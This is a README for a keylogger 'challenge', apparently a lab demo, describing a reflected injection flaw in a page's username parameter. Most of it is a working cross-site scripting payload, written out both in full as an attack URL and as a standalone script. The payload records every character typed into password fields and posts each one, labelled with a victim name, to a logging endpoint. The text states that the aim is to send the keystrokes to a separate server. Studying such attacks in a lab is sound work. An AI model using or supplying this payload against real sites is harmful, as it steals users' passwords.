
# Keylogger Challenge


### The objective of this challenge:
- Inject a script that saved every character that is types into a password input


## How it works

- profile.html is a demo page that lets a user change their password by entering a new password and confirming it

- There is a get request with a username variable. The variable data is displayed in an invisible div

- The original url looks like this:
```
http://localhost/keylogger/profile.html?username=tal

```

- The page is vulnerable to an injection.

- The below script is injected into the page via the get request

- The url with the injected script looks like this:

```
http://localhost/keylogger/profile.html?username=<script>result="";$(":password").keypress(function(e) {result=String.fromCharCode(e.which);$.post('http://localhost/keylogger/keylogger.php',{"logged_key":result,"victim":"test-victim"}, function(data){});});</script>
```

- The script does the following:

- Every time the user types a character into any password input the character is saved in a log file. (key_logger.log)

- The log shows the character entered and the victims name (or whatever you choose in the script)

- For the purpose of this demo, the log file is on the same localhost, but the objective is to save the characters in the log file on a different server

```javascript
<script>
    result="";
    $(":password").keypress(function(e) {
        result=String.fromCharCode(e.which);
        $.post('http://localhost/keylogger/keylogger.php',{"logged_key":result,"victim":"test-victim"}, function(data){});
    });
</script>
```

## Author
This keylogger was created by Tal Sperling
- talaksu@gmail.com
